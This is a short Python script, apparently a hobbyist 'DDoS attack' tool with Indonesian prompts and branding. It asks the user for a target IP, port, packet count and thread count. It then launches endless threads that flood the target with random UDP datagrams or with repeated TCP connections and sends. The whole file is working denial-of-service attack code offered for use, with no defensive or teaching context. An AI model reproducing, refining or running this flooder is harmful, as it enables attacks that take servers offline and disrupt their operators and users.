import random
import socket
import threading
import os

os.system("clear")
print("TOOLS BY UDINZ")
print("UDIN NIH")
print("Mau rename? PM me ")
ip = str(input(" Ip servers yang mau lo ddos | Ip:"))
port = int(input(" Port Server yang mau lo ddos | Port:"))
choice = str(input(" DdosAttackByUdinzr | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByUdinz | Packets:"))
threads = int(input(" DdosAttackByUdinZ | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | UdinZ |")
		except:
			print("[!] | KONTOLLL  |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" UdinZ Ni Bos!!")
		except:
			s.close()
			print("[*] KONTOLL")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
